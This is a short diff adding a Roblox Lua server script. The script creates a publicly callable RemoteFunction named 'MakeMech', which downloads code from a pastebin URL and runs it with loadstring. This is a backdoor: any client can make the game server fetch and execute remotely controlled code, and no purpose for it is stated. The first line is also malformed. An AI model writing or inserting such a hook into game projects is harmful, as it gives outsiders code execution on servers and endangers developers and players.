@@ -1,0 +1,7 @@
+v\wait();
+MakeMech = Instance.new("RemoteFunction",game.ReplicatedStorage);
+HttpService = game:GetService("HttpService");
+MakeMech.Name = "MakeMech";
+MakeMech.OnServerInvoke = function(plr)
+   return loadstring(HttpService:GetAsync("http://pastebin.com/raw.php?i=nzk4pMSs"))();
+end
